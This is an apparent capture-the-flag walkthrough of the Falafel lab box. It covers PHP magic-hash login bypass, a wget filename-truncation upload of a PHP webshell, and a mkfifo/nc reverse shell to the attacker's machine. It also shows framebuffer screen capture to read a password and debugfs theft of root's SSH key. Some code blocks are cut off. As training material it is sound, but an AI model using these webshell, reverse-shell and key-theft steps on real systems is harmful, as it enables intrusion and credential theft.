<p>Falafel requires careful reading of the application hints, authentication behavior, upload handling, and local permissions.</p>
<h3 id="working-method-2">Working method</h3>
<p>Falafel is a <strong>hard</strong> Linux box. That means:</p>

<h2 id="phase-3-authentication-recon-finding-the-cracks">Phase 3: Authentication Recon - Finding the Cracks</h2>
<h3 id="step-3a-test-the-login-form-manually">Step 3A: Test the Login Form Manually</h3>
<p>Visit <code>http://10.129.229.139/login.php</code>. Try logging in with:</p>
<ul>
<li>Username: <code>admin</code>, Password: <code>REDACTED</code></li>
<li>Username: <code>nonexistent</code>, Password: <code>REDACTED</code></li>
</ul>
<p><strong>Observe the error messages:</strong></p>
<ul>
<li>Non-existent user: <code>"Try again"</code></li>
<li>Existing user, wrong password: <code>REDACTED</code></li>
</ul>
<p><strong>This is an information disclosure vulnerability.</strong> The application tells us whether a username exists <em>before</em> checking the password. This means:</p>
<ol>
<li>We can enumerate valid usernames.</li>
<li>The backend likely runs a query like <code>SELECT * FROM users WHERE username = '$input'</code> first.</li>
<li>If the username exists, it <em>then</em> checks the password.</li>
</ol>
<p>This two-step process is a classic pattern - and a classic mistake. It gives us binary feedback (username exists / doesn't exist), which is the foundation for blind SQL injection attacks.</p>
<h3 id="step-3b-username-enumeration-with-wfuzz">Step 3B: Username Enumeration with wfuzz</h3>
<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">wfuzz -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \

<p><strong>What does this do?</strong></p>
<ul>
<li><code>-c</code> = colored output (easier to read)</li>
<li><code>-w</code> = wordlist (list of common names)</li>
<li><code>-d</code> = POST data. <code>FUZZ</code> is replaced by each wordlist entry</li>
<li><code>--hh 7074</code> = hide responses with 7074 characters (the "Try again" response for invalid users)</li>
</ul>
<p><strong>Results:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 10"><code>admin   (response size different)

</code></pre>
<p> We now know two valid accounts: <code>admin</code> and <code>chris</code>. We also know the application responds differently based on username validity. This confirms our hypothesis about the two-step authentication process.</p>
<p><strong>Why does this matter?</strong> Because if the app checks username first, we can inject SQL into the username field and use the password error message as a "true/false" oracle. This is called <strong>boolean-based blind SQL injection</strong>.</p>

<h2 id="phase-4-php-type-juggling-the-magic-hash-attack">Phase 4: PHP Type Juggling - The Magic Hash Attack</h2>
<h3 id="understanding-the-vulnerability">Understanding the Vulnerability</h3>
<p>PHP has a feature called <strong>type juggling</strong>. When you use a loose comparison operator (<code>==</code>), PHP tries to automatically convert variables to compatible types before comparing them. This is different from strict comparison (<code>===</code>), which checks both value <em>and</em> type.</p>
<p><strong>Example:</strong></p>
<pre tabindex="0" aria-label="php code or terminal block 11"><code class="language-php" data-language="php">var_dump("0e123456" == "0e987654");  // bool(true)
var_dump("0e123456" === "0e987654"); // bool(false)
</code></pre>
<p><strong>Why is the first one true?</strong>
PHP sees strings that start with <code>0e</code> followed by digits. It interprets these as <strong>scientific notation</strong> (0 × 10^anything = 0). Both sides evaluate to the float <code>0.0</code>, so <code>0.0 == 0.0</code> is <code>true</code>.</p>
<h3 id="how-does-this-apply-to-password-hashing">How Does This Apply to Password Hashing?</h3>
<p>Many PHP applications store MD5 password hashes and compare them like this:</p>
<pre tabindex="0" aria-label="php code or terminal block 12"><code class="language-php" data-language="php">if ($stored_hash == md5($user_password)) {
    login_successful();
}
</code></pre>
<p><strong>The attack:</strong> If the stored hash starts with <code>0e</code> followed by only digits, it is a <strong>magic hash</strong>. If we can find <em>any</em> password whose MD5 hash also starts with <code>0e...</code>, the loose comparison will evaluate to <code>true</code>.</p>
<h3 id="the-magic-hash-for-md5">The Magic Hash for MD5</h3>
<table tabindex="0" aria-label="The Magic Hash for MD5 data table">
<thead>
<tr>
<th scope="col">Input</th>
<th scope="col">MD5 Hash</th>
</tr>
</thead>
<tbody><tr>
<td><code>240610708</code></td>
<td><code>REDACTED_HASH_OR_FLAG</code></td>
</tr>
</tbody></table>
<p>Any hash starting with <code>0e</code> and containing only digits after it will be interpreted as <code>0.0</code> in PHP.</p>
<h3 id="step-4a-test-the-magic-hash-login">Step 4A: Test the Magic Hash Login</h3>
<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">curl -s -X POST -d "username=admin&amp;password=REDACTED" \
  -c cookies.txt http://10.129.229.139/login.php | grep -i "upload"
</code></pre>
<p><strong>Result:</strong> We see links to <code>upload.php</code>, <code>profile.php</code>, and <code>logout.php</code>. <strong>We are authenticated as admin.</strong></p>
<p><strong>We bypassed authentication without knowing the real password.</strong> We didn't brute-force it, we didn't SQL inject it (though that was possible too), and we didn't need to crack any hash. We exploited the developer's misunderstanding of PHP's type system.</p>
<p><strong>Why is this so powerful?</strong> Because the developer probably thought they were safe. They stored hashed passwords. They didn't store plaintext. But they used <code>==</code> instead of <code>===</code>, and that single-character difference (<code>=</code> vs <code>===</code>) completely broke their authentication.</p>

<h2 id="phase-5-file-upload-exploitation-filename-truncation">Phase 5: File Upload Exploitation - Filename Truncation</h2>
<h3 id="understanding-the-upload-mechanism">Understanding the Upload Mechanism</h3>
<p>Visit <code>http://10.129.229.139/upload.php</code>. The page allows you to submit a URL to an image. The server downloads it using <code>wget</code>.</p>
<p><strong>Attempt 1:</strong> Try uploading a direct PHP shell (<code>shell.php</code>).
<strong>Result:</strong> "Extension not allowed" or similar error.</p>
<p><strong>Attempt 2:</strong> Try uploading <code>shell.php.png</code>.
<strong>Result:</strong> The server downloads it... but it's saved as <code>.php.png</code> and doesn't execute as PHP.</p>
<p><strong>The developer applied a filter. Filters can always be bypassed if you understand the underlying mechanism.</strong></p>
<h3 id="the-wget-filename-limit">The Wget Filename Limit</h3>
<p><code>wget</code> has a built-in filename length limit of <strong>236 characters</strong>. If a URL's filename is longer than 236 characters, <code>wget</code> truncates it.</p>
<p><strong>The critical insight:</strong> The extension filter runs <em>before</em> <code>wget</code> saves the file. So:</p>
<ol>
<li>Filter sees <code>longname.php.png</code> → allows it (<code>.png</code> is valid)</li>
<li><code>wget</code> downloads the file</li>
<li><code>wget</code> truncates the filename to 236 chars</li>
<li>The <code>.png</code> part gets cut off</li>
<li>The file is now saved as <code>longname.php</code></li>
</ol>
<h3 id="step-5a-create-the-webshell">Step 5A: Create the Webshell</h3>
<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">cd /tmp
echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' &gt; $(python3 -c 'print("A"*232 + ".php.png")')
</code></pre>
<p><strong>Why 232 A's?</strong></p>
<ul>
<li>The full URL is: <code>http://10.10.16.84:8081/</code> (24 chars) + <code>A*232</code> (232 chars) + <code>.php.png</code> (8 chars) = 264 chars total</li>
<li>But <code>wget</code> counts only the filename part, and the truncation point is carefully chosen so that <code>.png</code> falls beyond the 236-character limit for the filename portion</li>
<li>The math: we want the final saved name to be <code>A*232.php</code> (236 chars total), so the <code>.png</code> gets truncated</li>
</ul>
<h3 id="step-5b-start-a-local-web-server">Step 5B: Start a Local Web Server</h3>
<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">cd /tmp &amp;&amp; python3 -m http.server 8081
</code></pre>
<p><strong>Why?</strong> The target server fetches the file from our machine. We need to host it.</p>
<h3 id="step-5c-submit-the-upload">Step 5C: Submit the Upload</h3>
<pre tabindex="0" aria-label="bash code or terminal block 16"><code class="language-bash" data-language="bash">cd /tmp
FILENAME=$(python3 -c 'print("A"*232 + ".php.png")')
curl -s -b cookies.txt -X POST \
  -d "url=http://10.10.16.84:8081/$FILENAME" \
  http://10.129.229.139/upload.php | grep -E "CMD|New name|uploads/"
</code></pre>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 17"><code>CMD: cd /var/www/html/uploads/0531-1954_30d7e3e4cc82c58e; wget 'http://10.10.16.84:8081/AAAA...AAAA.php.png'
New name is AAAAAAAAA...AAAAAAAA.php.
</code></pre>
<p><strong>Notice the dot at the end!</strong> The <code>.png</code> was truncated. The file is now <code>.php.</code> (the trailing dot is just how the output formats it).</p>
<p><strong>We defeated two protections at once.</strong></p>
<ol>
<li>The extension filter (saw <code>.png</code>, allowed it)</li>
<li>The filename save mechanism (<code>wget</code> truncated the name, leaving <code>.php</code>)</li>
</ol>
<p>This is a classic example of <strong>intersection of behaviors</strong> - two systems (the upload filter and wget) have different ideas of what the filename is, and that discrepancy creates a vulnerability.</p>

<h2 id="phase-6-initial-access-catching-a-shell">Phase 6: Initial Access - Catching a Shell</h2>
<h3 id="step-6a-test-code-execution">Step 6A: Test Code Execution</h3>
<pre tabindex="0" aria-label="bash code or terminal block 18"><code class="language-bash" data-language="bash">curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=id"
</code></pre>
<p><strong>Result:</strong> <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
<h3 id="step-6b-upgrade-to-reverse-shell">Step 6B: Upgrade to Reverse Shell</h3>
<p>A webshell is fine for single commands, but we want an interactive shell for exploring the system, running <code>su</code>, and generally having a better time.</p>
<p><strong>Start a listener on Kali:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">nc -lnvp 4444
</code></pre>
<p><strong>Trigger the reverse shell:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.84%204444%20%3E%2Ftmp%2Ff"
</code></pre>
<p><strong>Decoded payload:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.16.84 4444 &gt; /tmp/f
</code></pre>
<p><strong>How this works:</strong></p>
<ol>
<li><code>mkfifo /tmp/f</code> creates a named pipe (FIFO)</li>
<li><code>cat /tmp/f</code> reads from the pipe</li>
<li>The output goes to <code>/bin/sh -i</code> (interactive shell)</li>
<li>The shell's output goes through <code>nc</code> back to our listener</li>
<li><code>nc</code>'s output goes back into the pipe (<code>&gt; /tmp/f</code>)</li>
<li>This creates a full duplex communication channel</li>
</ol>
<p><strong>Result on Kali:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 22"><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.229.139] 45290
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p> We now have a shell as <code>www-data</code>. This is the web server user - heavily restricted, but we can read web files, configuration files, and anything the web server has access to. Our next goal is to find credentials or misconfigurations that let us become a real user.</p>

<h3 id="step-7a-read-web-application-files">Step 7A: Read Web Application Files</h3>
<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">cat /var/www/html/connection.php
</code></pre>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="php code or terminal block 24"><code class="language-php" data-language="php">&lt;?php
   define('DB_SERVER', 'localhost:3306');

   define('DB_DATABASE', 'falafel');

<p>Credential reuse made the database password worth testing against the local <code>moshe</code> account.</p>
<h3 id="step-7b-upgrade-the-shell">Step 7B: Upgrade the Shell</h3>
<p>Basic <code>nc</code> shells are "dumb" - they don't handle TTY properly, so <code>su</code> won't work directly.</p>
<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
</code></pre>
<p>This gives us a pseudo-terminal, making the shell behave more like a real SSH session.</p>
<h3 id="step-7c-become-moshe">Step 7C: Become Moshe</h3>
<pre tabindex="0" aria-label="bash code or terminal block 26"><code class="language-bash" data-language="bash">su moshe

uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
</code></pre>
<h3 id="step-7d-get-the-user-flag">Step 7D: Get the User Flag</h3>

Look at that list - <code>video</code>, <code>audio</code>, <code>floppy</code>, <code>games</code>, <code>adm</code>... these are not random. On a CTF box, unusual group memberships are <strong></strong> part of the intended path.</p>

<h2 id="phase-8-privilege-escalation-to-yossi-the-framebuffer">Phase 8: Privilege Escalation to Yossi - The Framebuffer</h2>
<h3 id="step-8a-check-who-else-is-logged-in">Step 8A: Check Who Else is Logged In</h3>
<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">w
</code></pre>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 30"><code>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1     -                Sat23   20:52m  0.04s  0.03s -bash
</code></pre>
<p><strong> <code>yossi</code> is physically logged in on <code>tty1</code>.</strong> This means there's a real monitor and keyboard attached (or a virtual console). If we can see the screen, we might see what yossi is doing - maybe typing a password.</p>
<h3 id="step-8b-check-video-group-access">Step 8B: Check Video Group Access</h3>
<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">groups
ls -l /dev/fb*
</code></pre>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 32"><code>crw-rw---- 1 root video 29, 0 May 1 19:42 /dev/fb0
</code></pre>
<p><strong>What is <code>/dev/fb0</code>?</strong>
The <strong>framebuffer</strong> is a memory-mapped device that represents the current contents of the screen. On Linux systems with a GUI or console, <code>/dev/fb0</code> contains the raw pixel data being displayed.</p>
<p><strong>Why does <code>video</code> group matter?</strong>
The framebuffer device is owned by <code>root</code> with group <code>video</code>. Since <code>moshe</code> is in the <code>video</code> group, we can read the screen.</p>
<h3 id="step-8c-capture-the-screen">Step 8C: Capture the Screen</h3>
<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">cat /dev/fb0 &gt; /tmp/screenshot.raw
</code></pre>
<h3 id="step-8d-get-screen-resolution">Step 8D: Get Screen Resolution</h3>
<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash">cat /sys/class/graphics/fb0/virtual_size
</code></pre>
<p><strong>Result:</strong> <code>1176,885</code></p>
<p><strong>Why do we need this?</strong>
The raw framebuffer is just a blob of bytes. To convert it to an image, we need to know:</p>
<ul>
<li>Width: 1176 pixels</li>
<li>Height: 885 pixels</li>
<li>Pixel format: we have to guess this (common formats: <code>rgb565</code>, <code>0rgb</code>, <code>bgr24</code>)</li>
</ul>
<h3 id="step-8e-transfer-to-kali-and-convert">Step 8E: Transfer to Kali and Convert</h3>
<pre tabindex="0" aria-label="bash code or terminal block 35"><code class="language-bash" data-language="bash"># On Kali
scp moshe@10.129.229.139:/tmp/screenshot.raw ./screenshot.raw

# Convert with ffmpeg
ffmpeg -pix_fmt 0rgb -s 1176x885 -f rawvideo -i screenshot.raw -frames:v 1 screenshot.jpg
xdg-open screenshot.jpg
</code></pre>
<p><strong>What we see in the image:</strong>
Yossi is at a terminal. He typed his password by mistake into the username field of the <code>passwd</code> command:</p>
<pre tabindex="0" aria-label="Code or terminal block 36"><code>yossi@falafel:~$ passwd
Changing password for yossi.
(current) UNIX password: REDACTED
</code></pre>
<p><strong>Password:</strong> <code>REDACTED</code></p>
<p><strong>The framebuffer is an often-overlooked attack vector.</strong> If a user is physically logged in and you have <code>video</code> group access, you can literally <em>see their screen</em>. This is not theoretical - it's exactly what we just did. On shared systems, kiosks, or servers with physical consoles, this is a real threat.</p>
<h3 id="step-8f-ssh-as-yossi">Step 8F: SSH as Yossi</h3>
<pre tabindex="0" aria-label="bash code or terminal block 37"><code class="language-bash" data-language="bash">ssh yossi@10.129.229.139
</code></pre>
<p>Password: <code>REDACTED</code></p>

<h2 id="phase-9-privilege-escalation-to-root-the-disk-group">Phase 9: Privilege Escalation to Root - The Disk Group</h2>
<h3 id="step-9a-check-yossi-s-groups">Step 9A: Check Yossi's Groups</h3>
<pre tabindex="0" aria-label="bash code or terminal block 38"><code class="language-bash" data-language="bash">groups
</code></pre>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 39"><code>yossi adm disk cdrom dip plugdev lpadmin sambashare
</code></pre>
<p><strong> <code>disk</code> group is incredibly powerful.</strong> Members of the <code>disk</code> group can read and write directly to raw disk devices (<code>/dev/sda</code>, <code>/dev/sda1</code>, etc.). This means you can bypass the entire Linux permission system and read <em>any file on the disk</em>, including <code>/root/.ssh/id_rsa</code>, <code>/etc/shadow</code>, or anything else.</p>
<p><strong>Why is this dangerous?</strong>
The <code>disk</code> group is effectively root access because you can mount, read, and write the raw filesystem. The OS permission checks happen at the filesystem level, but if you're reading the raw device, you're bypassing those checks entirely.</p>
<h3 id="step-9b-enumerate-disk-devices">Step 9B: Enumerate Disk Devices</h3>
<pre tabindex="0" aria-label="bash code or terminal block 40"><code class="language-bash" data-language="bash">df
blkid
</code></pre>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 41"><code>/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
</code></pre>
<h3 id="step-9c-use-debugfs-to-access-root-s-files">Step 9C: Use debugfs to Access Root's Files</h3>
<p><code>debugfs</code> is a filesystem debugger that can operate on unmounted or mounted ext filesystems. Since we can read <code>/dev/sda1</code> (thanks to <code>disk</code> group), we can use <code>debugfs</code> to browse the filesystem as if we were root.</p>
<pre tabindex="0" aria-label="bash code or terminal block 42"><code class="language-bash" data-language="bash">debugfs /dev/sda1
</code></pre>
<p><strong>Inside debugfs:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 43"><code>debugfs: ls -l /root/.ssh
  56604   40755 (2)      0      0    4096 13-Sep-2022 18:51 .
   2456   40750 (2)      0      0    4096 30-May-2026 23:18 ..
  56619  100600 (1)      0      0    1679 28-Nov-2017 23:01 id_rsa
  56629  100644 (1)      0      0     394 28-Nov-2017 23:01 id_rsa.pub
  56631  100600 (1)      0      0     394 28-Nov-2017 23:17 authorized_keys

debugfs: dump /root/.ssh/id_rsa /tmp/id_rsa
debugfs: quit
</code></pre>
<p> We just extracted root's private SSH key by reading the raw disk device. The Linux kernel never checked whether <code>yossi</code> had permission to read <code>/root/.ssh/id_rsa</code> because we went <em>around</em> the kernel's permission system entirely.</p>
<h3 id="step-9d-ssh-as-root">Step 9D: SSH as Root</h3>
<pre tabindex="0" aria-label="bash code or terminal block 44"><code class="language-bash" data-language="bash">chmod 600 /tmp/id_rsa
ssh -i /tmp/id_rsa root@localhost
</code></pre>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 45"><code>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)
root@falafel:~#
</code></pre>
<h3 id="step-9e-get-the-root-flag">Step 9E: Get the Root Flag</h3>
<pre tabindex="0" aria-label="bash code or terminal block 46"><code class="language-bash" data-language="bash">cat /root/root.txt
</code></pre>
<p><strong>Flag:</strong> <code>cc38a0[redacted]3341cd5</code></p>

<h2 id="key-lessons-and-takeaways">Key Lessons &amp; Takeaways</h2>
<h3 id="1-the-developer-is-your-best-source-of-intelligence">1. The Developer is Your Best Source of Intelligence</h3>
<p><code>cyberlaw.txt</code> literally handed us the entire exploitation path. read every file, every error message, every comment. Developers leave breadcrumbs everywhere.</p>
<h3 id="2-understand-the-language-not-just-the-framework">2. Understand the Language, Not Just the Framework</h3>
<p>PHP type juggling is a language-level quirk. If you only know "SQL injection" and "XSS", you miss vulnerabilities like this. Understanding how PHP compares strings and numbers is fundamental.</p>
<h3 id="3-filter-bypass-understanding-the-underlying-mechanism">3. Filter Bypass = Understanding the Underlying Mechanism</h3>
<p>The upload filter was not bypassed by a magic payload. It was bypassed by understanding that <strong>the filter and wget had different filename length limits</strong>. This is an intersection vulnerability - two systems interacting in an unexpected way.</p>
<h3 id="4-groups-matter-more-than-you-think">4. Groups Matter More Than You Think</h3>
<ul>
<li><code>video</code> → read framebuffer → screenshot of active session</li>
<li><code>disk</code> → read raw disk → bypass all filesystem permissions</li>
<li><code>adm</code> → read logs</li>
<li><code>audio</code> → record microphone (on some systems)</li>
</ul>
<p>On Linux, unusual group memberships are almost always part of the intended privilege escalation path.</p>
<h3 id="5-the-framebuffer-is-a-real-attack-vector">5. The Framebuffer is a Real Attack Vector</h3>
<p>Most penetration testers forget about <code>/dev/fb0</code>. But on systems with physical consoles or VMs with video devices, the framebuffer can reveal passwords, keystrokes, and sensitive data.</p>
<h3 id="raw-disk-access">Raw disk access</h3>
<p>The <code>disk</code> group is effectively root. If you ever encounter it during a penetration test, treat it as a critical finding. With <code>debugfs</code>, <code>dd</code>, or even direct <code>strings</code> on <code>/dev/sda1</code>, you can extract any file on the system.</p>
<h3 id="7-documentation-is-professionalism">7. Documentation is Professionalism</h3>
<p>Preserving Nmap output, commands, paths, and responses makes the work reproducible and supports accurate reporting.</p>
